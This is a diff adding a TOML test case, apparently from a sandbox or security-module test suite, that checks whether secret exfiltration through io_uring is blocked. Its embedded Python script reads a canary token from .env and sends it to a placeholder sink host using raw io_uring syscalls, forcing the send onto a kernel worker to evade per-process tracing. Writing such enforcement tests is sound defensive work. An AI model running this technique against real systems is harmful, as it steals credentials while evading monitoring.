@@ -1,0 +1,41 @@
+# SEND names a connected socket only; the LSM must enforce its real peer.
+name = "io-uring-send-exfil"
+kind = "attack"
+policy = "recommended"
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "ring.py"
+contents = """
+import ctypes, mmap, socket, struct
+libc = ctypes.CDLL(None, use_errno=True)
+libc.syscall.restype = ctypes.c_long
+s = socket.socket()
+s.connect(('{SINK_HOST}', {SINK_PORT}))
+secret = open('.env', 'rb').read()
+params = ctypes.create_string_buffer(120)
+ring = libc.syscall(425, ctypes.c_uint(4), params)
+if ring < 0:
+    raise OSError(ctypes.get_errno(), 'io_uring_setup unavailable')
+p = params.raw
+entries = struct.unpack_from('I', p, 0)[0]
+head, tail, mask, _, _, _, array = struct.unpack_from('7I', p, 40)
+sq = mmap.mmap(ring, array + 4 * entries, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE, offset=0)
+sqes = mmap.mmap(ring, 64 * entries, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE, offset=0x10000000)
+buf = ctypes.create_string_buffer(secret, len(secret))
+# IOSQE_ASYNC forces execution on an io-wq worker, not the submitting tracee.
+struct.pack_into('BBHiQQII', sqes, 0, 26, 16, 0, s.fileno(), 0, ctypes.addressof(buf), len(secret), 0)
+struct.pack_into('I', sq, array, 0)
+struct.pack_into('I', sq, tail, struct.unpack_from('I', sq, tail)[0] + 1)
+libc.syscall(426, ctypes.c_uint(ring), ctypes.c_uint(1), ctypes.c_uint(1), ctypes.c_uint(1), None, ctypes.c_size_t(0))
+"""
+
+[[steps]]
+run = "python3 ring.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw"]
